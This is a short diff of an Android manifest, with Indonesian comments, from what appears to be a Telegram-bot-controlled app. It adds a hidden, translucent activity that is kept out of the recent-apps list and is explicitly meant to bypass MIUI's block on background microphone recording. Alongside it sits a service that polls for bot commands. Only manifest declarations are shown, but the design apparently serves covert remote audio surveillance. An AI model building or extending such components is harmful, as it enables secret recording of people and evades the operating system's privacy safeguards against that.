@@ -40,6 +40,13 @@
             </intent-filter>
         </activity>
 
+        <!-- Non-visible Activity untuk rekaman audio di MIUI (bypass background mic block) -->
+        <activity
+            android:name=".AudioRecorderActivity"
+            android:exported="false"
+            android:excludeFromRecents="true"
+            android:theme="@style/Theme.AppCompat.Translucent" />
+
         <!-- Foreground service untuk polling perintah bot -->
         <service
             android:name=".TelegramService"
